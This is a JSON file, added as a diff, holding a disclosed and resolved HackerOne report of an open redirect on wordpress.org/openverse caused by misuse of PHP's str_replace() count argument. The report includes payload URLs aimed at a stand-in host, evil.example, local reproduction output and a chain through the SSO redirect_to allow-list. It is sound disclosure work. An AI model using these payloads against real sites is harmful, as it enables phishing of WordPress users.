@@ -1,0 +1,137 @@
+{
+  "id": 3933198,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTMzMTk4",
+  "url": "https://hackerone.com/reports/3933198",
+  "title": "wordpress.org/openverse/: unauthenticated open redirect — `str_replace()`'s 4th arg is a count, not a limit; bypasses WordPress.org SSO allow-list",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-08-11T19:03:03.665Z",
+  "submitted_at": "2026-08-11T19:03:03.945Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jakubk",
+    "url": "/jakubk",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/stj402qv8vdsgjxvp8f1b7y5nimu/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 55,
+    "url": "https://hackerone.com/wordpress",
+    "handle": "wordpress",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/e68529859b080f77ebfd9e0a1acafdf062bd4c43f1db58e7e55c81e6ceae2d0d"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "WordPress",
+      "twitter_handle": "wordpress",
+      "website": "https://wordpress.org/",
+      "about": "Beautiful sites of any kind."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-30T21:41:09.957Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-30T21:41:07.354Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Description:\n\nEvery request under `https://wordpress.org/openverse/…` is served by the `wporg-openverse` theme's\n`index.php`. With the redirect enabled, that template builds a target by concatenating a bare origin\n(`https://openverse.wordpress.net` — no trailing slash, enforced by the setting's own\n`sanitize_callback`) with the request path *after* removing the `/openverse` prefix.\n\nThe prefix removal is written as `str_replace( OPENVERSE_SUBPATH, '', $path, $count )` with\n`$count = 1` and the comment *\"Only replace the leading Openverse subpath.\"* But `str_replace()` has\nno limit parameter — its 4th argument is a by-reference **output** that receives the number of\nreplacements performed, and the `1` is silently overwritten. Every occurrence of `/openverse` is\ntherefore deleted, not just the leading one.\n\nA request path of `/openverse/openverse@evil.example/` collapses to `@evil.example/`, and\nconcatenating that onto a bare origin produces `https://openverse.wordpress.net@evil.example/` — a URL\nwhose authority is `evil.example`. It is then handed to `wp_redirect()`, not `wp_safe_redirect()`, so\nno allow-list is consulted.\n\n**Why this is not \"an open redirect with no security impact\":** The program excludes open redirects\nthat carry no security impact. This one defeats a security control that WordPress.org deliberately\nbuilt and maintains. The WordPress.org SSO plugin restricts post-login `redirect_to` targets to an\nallow-list of four domains (`common/includes/wporg-sso/class-wporg-sso.php:23-28`,\n`_is_valid_targeted_domain()` at `:203-224`). `https://wordpress.org/openverse/openverse@evil.example/`\n**is** a `wordpress.org` URL — its `parse_url(…, PHP_URL_HOST)` is literally `wordpress.org` — so it\npasses that allow-list, and then 301s the freshly-authenticated user to `evil.example`. That is exactly\nthe outcome the allow-list exists to prevent. Additional impact beyond a bare redirect: the response is\na **301** (browser caches the poisoned mapping for that `wordpress.org` URL); the link the victim sees\nhas hostname `wordpress.org` with no suspicious `?url=` parameter; the destination is reached with a\nreal `*.wordpress.org` referrer.\n\n**Asset:** `*.wordpress.org` — **meta** repository,\n`wordpress.org/public_html/wp-content/themes/pub/wporg-openverse` (`functions.php`, `index.php`), the\ntheme that serves the `/openverse/` site of the WordPress.org multisite.\n\n**Affected versions verified:** meta `trunk` at commit `08b412bd0b09c54528500073f90e3c4c50357a5b`\n(2026-07-27). Deployed WordPress.org code, not an unreleased branch — the theme is live and still\nmaintained (last touched 2026-05-22, `7b7c6bc`). No pre-release double bounty is claimed. (Confirmed\nstill present in current trunk: `get_target_url()` still uses `str_replace( …, $count )` with `$count = 1`.)\nThe redirect feature was introduced by <https://github.com/WordPress/wordpress.org/pull/98> (Meta Trac\n**#6578**) and WordPress announced on 2023-02-08 that it is live\n(<https://make.wordpress.org/openverse/2023/02/08/openverse-org-is-live/>).\n\n**Attacker privilege:** **Unauthenticated.** No WordPress.org account, no session, no CSRF token. The\nattacker only needs the victim to follow a link whose hostname is literally `wordpress.org`.\n**User interaction:** required — the victim follows the link. Normal interaction model for an open redirect.\n\n## Root cause with real file:line and verbatim code\n\n**1. All paths under `/openverse/` reach the theme template.**\n\n`wordpress.org` is a sub-directory multisite; core resolves the site from at most the first path\nsegment (`wp-includes/ms-load.php`, `ms_load_current_site_and_network()`:\n`$current_blog = get_site_by_path( $domain, $path, 1 );`). So `/openverse/<anything>/<anything>`\nresolves to the `/openverse/` site. The theme then forces `index.php` for every view and suppresses\nrequest parsing — `themes/pub/wporg-openverse/functions.php:46-48`:\n\n```php\n\tforeach ( array( '404', 'archive', 'author', 'category', 'tag', 'taxonomy', 'date', 'embed', 'home', 'frontpage', 'privacypolicy', 'page', 'paged', 'search', 'single', 'singular', 'attachment' ) as $template_type ) {\n\t\tadd_filter( $template_type . '_template', __NAMESPACE__ . '\\use_index_php_as_template' );\n\t}\n```\n\n`functions.php:79-85`:\n\n```php\nfunction disable_parse_request( $return, $wp ) {\n\t// Avoid E_WARNING: array_keys() expects parameter 1 to be array, null given in wp-includes/class-wp.php:548\n\t$wp->query_vars = array();\n\n\treturn false;\n}\nadd_filter( 'do_parse_request', __NAMESPACE__ . '\\disable_parse_request', 10, 2 );\n```\n\nThe function's own docblock confirms deep paths are expected to work —\n`functions.php:255-257`:\n\n```php\n * Examples:\n * - https://ru.wordpress.org/openverse → {ov_redirect_url}/ru/\n * - https://wordpress.org/openverse/search/?q=dog → {ov_redirect_url}/search/?q=dog\n```\n\n**2. The sink.** `themes/pub/wporg-openverse/functions.php:259-275`:\n\n```php\nfunction get_target_url() {\n\t$target_url = get_theme_mod( 'ov_redirect_url', OPENVERSE_STANDALONE_URL );\n\n\t$curr_locale = get_locale();\n\t$locale = get_locale_slug( $curr_locale );\n\tif ( $locale !== '' ) {\n\t\t$target_url .= '/' . $locale;\n\t}\n\n\t$path = $_SERVER['REQUEST_URI'];\n\tif ( $path ) {\n\t\t$count = 1; // Only replace the leading Openverse subpath.\n\t\t$target_url .= str_replace( OPENVERSE_SUBPATH, '', $path, $count );\n\t}\n\n\treturn $target_url;\n}\n```\n\n- `OPENVERSE_SUBPATH` is `'/openverse'` (`functions.php:25`).\n- `OPENVERSE_STANDALONE_URL` is `'https://openverse.wordpress.net'` (`functions.php:248`).\n- The base origin is guaranteed to be a bare scheme+host **with no trailing slash**, because the\n  Customizer setting strips one — `functions.php:296-304`:\n\n```php\n\t\t'sanitize_callback' => function( $val, $setting ) {\n\t\t\tif ( substr( $val, -1 ) == '/' ) { // If the last character is a slash '/',...\n\t\t\t\t$val = substr( $val, 0, -1 );    // ...remove it.\n\t\t\t}\n```\n\n  That is precisely what lets the concatenated remainder extend the **authority** rather than the\n  path, and it means the bug works against whatever origin is configured.\n- `get_locale_slug()` returns `''` for `en_US` (`functions.php:93-99`), so on `wordpress.org` itself\n  nothing is inserted between the origin and the attacker-controlled remainder.\n\n**3. Unsafe redirect API.** `themes/pub/wporg-openverse/index.php:23-31`:\n\n```php\n$is_redirect_enabled = get_theme_mod( 'ov_is_redirect_enabled' );\n$target_url = get_target_url();\n\nif ( $is_redirect_enabled ) {\n\twp_redirect( $target_url, 301 );\n\texit;\n} else {\n\techo \"<!-- \" . $target_url . \" -->\";\n}\n```\n\n`wp_redirect()` performs no destination validation; it applies only the `wp_redirect` filter and\n`wp_sanitize_redirect()`, which preserves `.` and `@`.\n\n**4. No compensating guard anywhere in the network.**\n\n- No `add_filter( 'wp_redirect', … )` exists in the meta repository or in `wporg-mu-plugins` (grepped\n  both trees; zero hits).\n- The only three `allowed_redirect_hosts` filters\n  (`plugin-directory/class-plugin-directory.php:54`, `wporg-learn/inc/redirects.php:8`,\n  `common/includes/wporg-sso/wp-plugin.php:289`) are consumed exclusively by\n  `wp_validate_redirect()`, i.e. by `wp_safe_redirect()`. They are irrelevant to `wp_redirect()`.\n\n## Steps To Reproduce:\n\nTwo payload families, plain ASCII, no encoding tricks, no account:\n\n**A — userinfo variant** (no attacker DNS setup at all, origin-agnostic):\n\n```\nhttps://wordpress.org/openverse/openverse@evil.example/\n→ Location: https://openverse.wordpress.net@evil.example/     (authority = evil.example)\n```\n\n**B — hostname-suffix variant** (attacker adds one DNS record; no userinfo in the address bar):\n\n```\nhttps://wordpress.org/openverse/openverse.evil.example/\n→ Location: https://openverse.wordpress.net.evil.example/\n```\n\nPath and query are fully attacker-chosen:\n\n```\nhttps://wordpress.org/openverse/openverse@evil.example/login?next=x\n→ Location: https://openverse.wordpress.net@evil.example/login?next=x\n```\n\n**No request was sent to any WordPress.org production host.** Everything below ran locally against the\nunmodified theme source.\n\n## Proof — real observed output\n\n### (1) PHP semantics of the 4th argument\n\n```\n$ php -r '$c=1; var_dump(str_replace(\"/openverse\",\"\",\"/openverse/openverse@evil.example/\",$c), $c);'\nstring(14) \"@evil.example/\"\nint(2)\n```\n\n`$count` is an *output*; both occurrences were removed, and the `1` was overwritten with `2`.\n\n### (2) End-to-end HTTP against the real, unmodified theme\n\nA tiny router boots WordPress 7.0.2 (so `wp_redirect()` / `wp_sanitize_redirect()` are the real core\nfunctions), `require`s the **untouched**\n`meta/…/themes/pub/wporg-openverse/functions.php`, supplies the two Customizer values under test via\n`theme_mod_*` **filters** (so no database state is mutated), and then executes the theme's own\n`index.php:23-31` verbatim. Observed responses:\n\n```\n=== BASELINE (the two docblock examples from functions.php:256-257) ===\nREQ /openverse/                                          Location: https://openverse.wordpress.net/\nREQ /openverse/search/?q=dog                             Location: https://openverse.wordpress.net/search/?q=dog\n\n=== PAYLOADS ===\nREQ /openverse/openverse@evil.example/                   Location: https://openverse.wordpress.net@evil.example/\nREQ /openverse/openverse.evil.example/                   Location: https://openverse.wordpress.net.evil.example/\nREQ /openverse/openverse@evil.example/login?next=x       Location: https://openverse.wordpress.net@evil.example/login?next=x\n\n=== NEGATIVE CONTROLS (proving this is specifically the multi-occurrence strip) ===\nREQ /openverse//evil.example                             Location: https://openverse.wordpress.net//evil.example\nREQ /openverse/@evil.example                             Location: https://openverse.wordpress.net/@evil.example\nREQ /openverse/x/openverse.evil.example                  Location: https://openverse.wordpress.net/x.evil.example\n```\n\nThe baseline rows are byte-for-byte what the function's own documentation promises, and are\nunaffected. The three controls stay on-origin — this is not generic path confusion, it is the second\n`/openverse` being eaten.\n\n### (3) A real browser follows it, with no prompt\n\nSame router, with `ov_redirect_url` filtered to a local stand-in origin of the same shape\n(`http://openverse.wordpress.net`, no trailing slash) so that the browser can be allowed to complete\nthe navigation. The `Location` header below is produced by the **real theme code**, not hand-written:\n\n```\n$ curl -sS -i --path-as-is \"http://127.0.0.1:8605/openverse/openverse@127.0.0.1:8605/landed\"\nHTTP/1.1 301 Moved Permanently\nX-Redirect-By: WordPress\nLocation: http://openverse.wordpress.net@127.0.0.1:8605/landed\n\n$ chromium --headless --no-sandbox --disable-gpu --virtual-time-budget=6000 \\\n    --dump-dom \"http://127.0.0.1:8605/openverse/openverse@127.0.0.1:8605/landed\"\n<!DOCTYPE html>\n<html><head></head><body>ATTACKER-ORIGIN-REACHED host=…127.0.0.1:8605</body></html>\n```\n\nChromium 145.0.7632.159 followed the userinfo form of the redirect straight to the other origin and\nthe landing page reported its own `location.host`. No interstitial, no warning.\n\n### (4) The SSO allow-list accepts the payload URL\n\n`common/includes/wporg-sso/class-wporg-sso.php:203-224`:\n\n```php\n\t\tprotected function _is_valid_targeted_domain( $host ) {\n\t\t\tif ( empty( $host ) || ! is_string( $host ) ) {\n\t\t\t\treturn false;\n\t\t\t}\n\n\t\t\tif ( strstr( $host, '/' ) ) {\n\t\t\t\t$host = parse_url( $host, PHP_URL_HOST );\n\t\t\t}\n\t\t\t…\n\t\t\t$host = $this->_get_targetted_host( $host );\n\n\t\t\treturn in_array( $host, self::VALID_HOSTS, true );\n\t\t}\n```\n\nwith `const VALID_HOSTS = [ 'wordpress.org', 'bbpress.org', 'buddypress.org', 'wordcamp.org' ]`\n(`:23-28`), consumed by `login_url()` (`:137`), `_get_safer_redirect_to()` (`:177`) and\n`wp_validate_redirect()` (`wp-plugin.php:733`).\n\n```\n$ php -r 'var_dump(parse_url(\"https://wordpress.org/openverse/openverse@evil.example/\", PHP_URL_HOST));'\nstring(13) \"wordpress.org\"\n```\n\nSo `https://login.wordpress.org/?redirect_to=<urlencoded payload>` is accepted as a legitimate target\nand becomes a login-branded, fully-trusted-domain launcher that deposits the freshly-authenticated\nuser on attacker-controlled content.\n\n## Honest limitations\n\n1. **Two runtime facts could not be verified by me**, because the rules of engagement forbid sending\n   traffic to production and I sent none:\n   - `ov_is_redirect_enabled` must be `true` for the `/openverse/` site. Its Customizer default is\n     `false` (`functions.php:322-326`). The public evidence that it is on: the WordPress project's own\n     2023-02-08 announcement that `wordpress.org/openverse` redirects to the standalone domain, and\n     PR #98 / Meta Trac #6578 which added exactly this code for exactly that purpose. Please confirm\n     the theme mod before triaging severity.\n   - `/openverse/` must still be served by this theme rather than by an edge/nginx redirect that never\n     reaches PHP. I cannot distinguish those from a local clone.\n2. Neither caveat affects the **code defect**, which is unconditional and reproduced above. If the\n   toggle is currently off, this is a latent defect that becomes live the moment anyone turns it on —\n   and the `else` branch it falls into (`echo \"<!-- \" . $target_url . \" -->\"`, `index.php:30`) is the\n   *same* unsanitised value emitted into HTML. I judged that branch not exploitable from a browser,\n   because browsers percent-encode `<` and `>` in the path and query, so the `-->` needed to escape\n   the HTML comment cannot be delivered by navigation — but it is one more reason to fix the\n   URL-building itself.\n3. Payload family B needs one attacker-controlled DNS record; family A needs nothing and is the one I\n   proved in a browser.\n\n## Recommendations\n\nTwo independent changes; please apply both.\n\n1. **Strip the prefix as a prefix** — `functions.php:268-272`:\n\n```php\n\t$path = $_SERVER['REQUEST_URI'] ?? '';\n\tif ( str_starts_with( $path, OPENVERSE_SUBPATH ) ) {\n\t\t$path = substr( $path, strlen( OPENVERSE_SUBPATH ) );\n\t}\n\tif ( '' === $path || '/' !== $path[0] ) {\n\t\t$path = '/' . ltrim( $path, '/' );   // never let the remainder extend the authority\n\t}\n\t$target_url .= $path;\n```\n\n   (`preg_replace( '#^' . preg_quote( OPENVERSE_SUBPATH, '#' ) . '#', '', $path, 1 )` is an equally\n   valid prefix-only strip — the point is that `str_replace()` cannot express \"only the first\".)\n\n2. **Defence in depth** — `index.php:27`: use `wp_safe_redirect( $target_url, 301 )` and register the\n   standalone origin through `allowed_redirect_hosts`, so that any future slip in the URL-building\n   logic cannot produce an off-site `Location`.\n\nA grep for `str_replace(` with a literal `1` in the 4th position across the meta repository is worth\ndoing at the same time — this is a repeatable API-misuse pattern, and PHP raises no diagnostic for it.\n\n## AI tooling disclosure\n\nPer the program's guidelines and the WordPress AI Guidelines:\n\n**AI assistance:** Yes — substantial.\n**Tool(s):** Claude (Anthropic), used through the Claude Code agentic harness.\n**Used for:** source review and candidate-vulnerability search; building and running the local test\nharnesses; and drafting this report — the prose here is largely AI-authored and subsequently reviewed\nand corrected by me.\n**Verification:** every technical claim was verified by executing it against a local installation.\nEvery quoted output is real observed output, not model narration; claims that did not survive that\nverification were removed before submission. No production host was contacted.\n**Responsibility:** I have reviewed the report in full and take responsibility for its content.\n\n## Prior art / duplicate check\n\n**Verdict: likely novel — and still live in current meta trunk.**\n\n- Verified against the current theme trunk: `get_target_url()` **still** uses `str_replace( OPENVERSE_SUBPATH, '', $path, $count )` with `$count = 1` (the misused 4th argument), rather than a prefix-only strip. Confirmed at <https://github.com/WordPress/wordpress.org/blob/trunk/wordpress.org/public_html/wp-content/themes/pub/wporg-openverse/functions.php> — not fixed.\n- The redirect feature and its code come from PR #98 / Meta Trac #6578 (<https://github.com/WordPress/wordpress.org/pull/98>), announced as live on 2023-02-08 (<https://make.wordpress.org/openverse/2023/02/08/openverse-org-is-live/>).\n- There is no public HackerOne report for this specific open redirect or SSO allow-list bypass. Historical WordPress open redirects on HackerOne (for example WordPress Feed #22142, BuddyPress `bp-profile-edit`) are unrelated.\n- The program excludes \"open redirects without security impact\". This one defeats the deliberately maintained WordPress.org SSO allow-list (`class-wporg-sso.php` VALID_HOSTS), so the exclusion does not apply; the report argues that explicitly.\n\nHackerOne hacktivity cannot be enumerated without authentication, so an undisclosed duplicate cannot be ruled out with certainty.\n\n## Impact\n\nAny visitor who follows a link whose hostname is literally `wordpress.org` is silently 301-redirected\nto a host the attacker controls, with a `*.wordpress.org` referrer and a browser-cached permanent\nmapping. Chained through `login.wordpress.org`'s `redirect_to`, it also defeats the WordPress.org SSO\nredirect allow-list, which is the specific control built to stop exactly this.\n\nPractically this is a high-quality phishing primitive against WordPress site owners, plugin authors\nand contributors — the population that is trained to check that a link points at `wordpress.org`.",
+  "weakness": {
+    "id": 53,
+    "name": "Open Redirect"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-30T21:41:07.556Z",
+  "allow_singular_disclosure_after": -143077.816522155,
+  "singular_disclosure_allowed": true,
+  "vote_count": 13,
+  "voters": [
+    "zy9ard3",
+    "jakubk",
+    "2026",
+    "flashmyname",
+    "th3kr1m0",
+    "ph03n1xsp",
+    "unravel11",
+    "cdrom95",
+    "notmydaytoday",
+    "zabava4",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2753,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.wordpress.org",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": [],
+    "can_view_ave_report?": false
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
